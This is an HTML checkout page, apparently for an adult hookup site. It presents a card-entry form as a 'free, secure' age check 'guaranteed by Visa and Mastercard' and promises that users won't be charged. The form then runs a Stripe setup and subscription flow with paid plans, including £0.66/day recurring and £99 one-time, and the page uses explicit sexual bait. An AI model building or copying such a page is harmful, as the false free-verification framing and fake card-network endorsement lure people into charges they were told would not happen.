<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
  <title>Checkout</title>
  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-FDQ6REQWS8');
  </script>
  <script src="https://js.stripe.com/v3/"></script>
  <style>
    :root{
      --brand:#ef476f;
      --brand-dark:#d43d61;
      --ink:#0f172a;
      --sub:#475569;
      --bg:#fdf2f8;
      --card:#ffffff;
      --line:#e5e7eb;
      --ring:#ffd1e0;
      --ok:#10b981;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      font-family: Arial, sans-serif;
      background: var(--bg);
      color: var(--ink);
      margin:0;
      padding: 12px;
      display:flex;
      align-items:flex-start;
      justify-content:center;
      -webkit-text-size-adjust:100%;
      overflow-x:hidden; /* prevent any sideways scroll */
    }

    /* CARD (mobile-first, compact) */
    #payment-form{
      width:100%;
      max-width: 520px;            /* narrower for small screens */
      background:var(--card);
      border-radius:14px;
      border:1px solid #f8c4d3;
      box-shadow: 0 10px 28px rgba(239,71,111,.14);
      padding:14px;                /* tight padding */
    }

    /* HERO */
    .hero{display:block; margin-bottom:12px}
    .hero h1{
      margin:0 0 8px 0;
      font-size: clamp(18px, 5vw, 22px);
      letter-spacing:.4px;
      text-transform:uppercase;
      color:var(--brand);
      text-align:center;
    }
    .hero-copy{
      background:#fff6fa;
      border:1px solid var(--ring);
      border-radius:10px;
      padding:10px;
      font-size:14px;
      line-height:1.5;
      color:var(--ink);
    }
    .hero-copy strong{font-weight:800}

    .steps{
      display:flex; gap:6px; flex-wrap:wrap;
      margin-top:8px; color:var(--sub); font-size:12px; justify-content:center;
    }
    .step{
      background:#fff; border:1px solid var(--line); border-radius:999px;
      padding:6px 10px;
    }

    /* PLANS (simple vertical stack) */
    .plans{display:grid; gap:8px; margin:14px 0 10px}
    .plan{
      display:grid; grid-template-columns:auto 1fr; gap:10px;
      padding:10px; border:1px solid var(--line); border-radius:12px; background:#fff;
      transition:box-shadow .18s ease, border-color .18s ease;
    }
    .plan:hover{box-shadow:0 8px 18px rgba(15,23,42,.06)}
    .plan input[type="radio"]{margin-top:6px; accent-color:var(--brand)}
    .plan label{display:block; cursor:pointer}
    .plan-title{
      display:block;
      font-size: clamp(20px, 5.2vw, 26px);
      font-weight:900; line-height:1.1; color:#0b0b0b;
    }
    .plan-fine{display:block; font-size:12px; color:var(--sub); margin-top:4px}

    /* Selected highlight */
    .plan input[type="radio"]:checked + label{
      border-radius:10px; outline:3px solid #ffe5ee; background:#fff8fb;
      padding:4px 6px;
    }

    /* FORM */
    label[for="cardholder-name"]{
      display:block; margin:10px 0 6px; font-weight:700; font-size:14px
    }
    input[type="text"]{
      width:100%; padding:12px; border:1px solid #d1d5db; border-radius:10px; font-size:16px; margin-bottom:10px;
    }
    #card-element{
      padding:12px; border:1px solid #d1d5db; border-radius:10px; margin-bottom:10px; background:#fafafa;
    }

    /* TRUST + CTA */
    .trust{
      display:flex; gap:6px; flex-wrap:wrap; align-items:center; margin:6px 0 10px; color:var(--sub); font-size:12px; justify-content:center;
    }
    .tag{display:flex; align-items:center; gap:6px; padding:6px 10px; background:#fff; border:1px solid var(--line); border-radius:999px}
    .ok{color:var(--ok); font-weight:800}

    #submit{
      width:100%;
      background:var(--brand); color:#fff; border:none; padding:14px 16px;
      border-radius:12px; font-size:16px; font-weight:800; letter-spacing:.3px;
      cursor:pointer;
    }
    #submit:hover{background:var(--brand-dark)}
    #submit[disabled]{opacity:.7; cursor:not-allowed}

    #message{margin-top:10px; font-size:14px; color:#b91c1c}

    /* Safe spacing on larger screens */
    @media (min-width: 640px){
      #payment-form{padding:16px}
    }

    /* ---------- Loading overlay ---------- */
    .loading-overlay{
      position:fixed; inset:0;
      background:rgba(255,255,255,.92);
      display:none; /* hidden by default */
      align-items:center; justify-content:center; flex-direction:column;
      z-index:9999;
      backdrop-filter:saturate(1.1) blur(2px);
    }
    .loading-overlay[aria-hidden="false"]{display:flex}
    .loading-box{
      width:min(92vw,420px);
      background:#fff; border:1px solid var(--line); border-radius:14px;
      box-shadow:0 10px 28px rgba(15,23,42,.12);
      padding:18px;
      text-align:center;
    }
    .loading-title{
      font-weight:900; letter-spacing:.3px; margin:2px 0 10px; color:var(--ink)
    }
    .progress-wrap{
      width:100%; height:10px; background:#f3f4f6; border-radius:999px; overflow:hidden; border:1px solid #e5e7eb;
    }
    .progress-bar{
      width:0%; height:100%; background:linear-gradient(90deg, var(--brand), var(--brand-dark));
      animation: loadingBar 2.2s ease-in-out infinite;
    }
    @keyframes loadingBar{
      0%{width:0%}
      60%{width:80%}
      100%{width:100%}
    }
    .loading-sub{font-size:12px; color:var(--sub); margin-top:8px}
    /* ---------- /Loading overlay ---------- */
  </style>
</head>
<body>
<script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>

<!-- Loading overlay -->
<div id="loading-overlay" class="loading-overlay" aria-hidden="true" aria-live="polite" aria-label="Processing payment">
  <div class="loading-box" role="status">
    <div class="loading-title">Verifying your ageâ€¦</div>
    <div class="progress-wrap" aria-hidden="true">
      <div class="progress-bar"></div>
    </div>
    <div class="loading-sub">Complete the 3d secure age-verification through your bank to fuck the girls on our site.</div>
  </div>
</div>
<!-- /Loading overlay -->

<form id="payment-form" aria-labelledby="age-title">
  <!-- HERO -->
  <div class="hero" role="region" aria-label="Age gate">
 
<!-- CHANGED TITLE -->
<h1 id="age-title">YOU'RE ALMOST IN!</h1>

<!-- ADDED SUBLINE + IMAGE LOGOS -->
<div style="text-align:center; font-size:13px; color:var(--sub); margin:-2px 0 8px;">
  Age verification guaranteed by:
  <div style="display:flex; gap:10px; justify-content:center; align-items:center; margin-top:6px;">
    <img src="charmr.xyz/logos/visa.png" alt="Visa" style="height:20px; width:auto;">
    <img src="charmr.xyz/logos/mastercard.png" alt="Mastercard" style="height:20px; width:auto;">
  </div>
</div>

    <div class="hero-copy">
      This community is for <strong>consenting adults only</strong>. To protect members and keep it 18+, we confirm your age with a quick, free, secure card check as provided by Visa and Mastercard.  This works because banks only issue credit cards to people over 18, so itâ€™s a fast way to keep our community adult-only. The card check is 100% free, you won't be charged.
      <br><br><strong>After this you may FUCK our members for FREE!</strong>
    </div>
    <div class="steps" aria-label="How it works">
      <div class="step">â‘  Choose a plan</div>
      <div class="step">â‘¡ Verify card</div>
      <div class="step">â‘¢ Start chatting</div>
    </div>
  </div>

  <!-- PLANS -->
  <div class="plans" role="group" aria-label="Subscription plans">
    <!-- 0.16/day -->
    <div class="plan">
      <input type="radio" name="plan" value="price_1Rsdy1EJXIhiKzYGOtzvwhUH" id="plan5" checked>
      <label for="plan5">
        <span class="plan-title">FREE AGE VERIFICATION</span>
      </label>
    </div>

    <!-- 0.66/day -->
    <div class="plan">
      <input type="radio" name="plan" value="price_1RsdzREJXIhiKzYG45b69nSl" id="plan20">
      <label for="plan20">
        <span class="plan-title">10 FREE HOOKUPS!</span>
        <span class="plan-fine">then <span class="curr-symbol">Â£</span>0.66/day</span>
      </label>
    </div>

    <!-- Â£99 one-time -->
    <div class="plan">
      <input type="radio" name="plan" value="price_1Rt6NcEJXIhiKzYGMsEZFd8f" id="plan99">
      <label for="plan99">
        <span class="plan-title">UNLIMITED HOOKUPS!</span>
        <span class="plan-fine"><span class="curr-symbol">Â£</span>99 one-time</span>
      </label>
    </div>
  </div>

  <label for="cardholder-name">Name on card</label>
  <input type="text" id="cardholder-name" placeholder="Full name" required />

  <div id="card-element"><!-- Stripe injects card input here --></div>

  <!-- Trust row -->
  <div class="trust">
    <div class="tag">ðŸ”’ Secure payment</div>
    <div class="tag">ðŸ•µ Discreet billing</div>
    <div class="tag ok">âœ” Age 18+ only</div>
  </div>

  <button type="submit" id="submit">VERIFY</button>
  <div id="message"></div>
</form>

<script>
  // Stripe integration (unchanged backend behavior)
  const stripe = Stripe("pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q");
  const elements = stripe.elements();
  const card = elements.create("card");
  card.mount("#card-element");

  const form = document.getElementById("payment-form");
  const message = document.getElementById("message");
  const submitBtn = document.getElementById("submit");

  /* ---------- Loading overlay helpers (updated) ---------- */
  const overlay = document.getElementById('loading-overlay');
  function showLoading(){ overlay.setAttribute('aria-hidden','false'); }
  function hideLoading(){ overlay.setAttribute('aria-hidden','true'); }

  // Track iframes present BEFORE submit so we only react to NEW ones
  let baselineIframes = new Set(Array.from(document.querySelectorAll('iframe')));

  function startThreeDSWatcher(){
    // Refresh baseline right when we begin (in case Elements mounted later)
    baselineIframes = new Set(Array.from(document.querySelectorAll('iframe')));

    const isThreeDSLike = (iframe) => {
      const t = (iframe.getAttribute('title') || '').toLowerCase();
      return t.includes('3d') || t.includes('secure') || t.includes('authentication') || t.includes('challenge');
    };

    const observer = new MutationObserver((mutations) => {
      for (const m of mutations) {
        for (const node of m.addedNodes) {
          if (node.tagName === 'IFRAME' && !baselineIframes.has(node)) {
            if (isThreeDSLike(node)) {
              // Hide overlay only when the 3DS iframe is actually ready
              const hideWhenReady = () => { hideLoading(); observer.disconnect(); };
              if (node.complete) hideWhenReady();
              else node.addEventListener('load', hideWhenReady, { once:true });
              return;
            }
          }
        }
      }
    });

    observer.observe(document.documentElement, { childList:true, subtree:true });
  }
  /* ---------- /Loading overlay helpers (updated) ---------- */

  async function startSubscription(priceId, cardholderName) {
    // 1) Create SetupIntent
    const siRes = await fetch("/api/stripe/setup-intent", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${localStorage.getItem("token")}`
      }
    });
    const siData = await siRes.json();
    if (!siRes.ok || !siData.clientSecret) {
      throw new Error("Failed to start payment setup.");
    }

    // 2) Confirm card setup (may open 3DS challenge)
    const { setupIntent, error } = await stripe.confirmCardSetup(siData.clientSecret, {
      payment_method: {
        card,
        billing_details: { name: cardholderName || "" }
      }
    });
    if (error) throw new Error(error.message);

    // 3) Create subscription
    const subRes = await fetch("/api/stripe/subscribe", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${localStorage.getItem("token")}`
      },
      body: JSON.stringify({
        priceId,
        paymentMethodId: setupIntent.payment_method
      })
    });
    const subData = await subRes.json();
    if (!subRes.ok) {
      throw new Error(subData?.error || "Subscription failed");
    }

    // Success -> go to thank you page
    window.location.href = `/thankyou.html?priceId=${encodeURIComponent(priceId)}`;
  }

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    message.textContent = "";
    submitBtn.disabled = true;
    showLoading();           // show immediately on click
    startThreeDSWatcher();   // watch for the real 3DS iframe

    const selectedPlan = document.querySelector('input[name="plan"]:checked').value;
    const name = document.getElementById("cardholder-name").value;

    try {
      await startSubscription(selectedPlan, name);
      // On success we navigate; overlay can stay until navigation completes.
    } catch (err) {
      console.error(err);
      hideLoading();         // reveal the page so the error is visible
      message.textContent = err.message || "Something went wrong. Try again.";
    } finally {
      submitBtn.disabled = false;
    }
  });
</script>

<!-- Currency symbol swap (US â†’ $, Eurozone â†’ â‚¬, otherwise keep Â£) -->
<script>
  (function () {
    const EUROZONE = new Set([
      "AT","BE","HR","CY","EE","FI","FR","DE","GR","IE","IT",
      "LV","LT","LU","MT","NL","PT","SK","SI","ES"
    ]);
    function setSymbol(symbol) {
      document.querySelectorAll('.curr-symbol').forEach(el => { el.textContent = symbol; });
    }
    try {
      fetch("https://ipapi.co/country/")
        .then(r => r.ok ? r.text() : Promise.reject())
        .then(cc => {
          cc = (cc || "").trim().toUpperCase();
          if (cc === "US") {
            setSymbol("$");
          } else if (EUROZONE.has(cc)) {
            setSymbol("â‚¬");
          } // else keep Â£
        })
        .catch(() => { /* leave Â£ on failure */ });
    } catch (_) { /* leave Â£ */ }
  })();
</script>
</body>
</html>
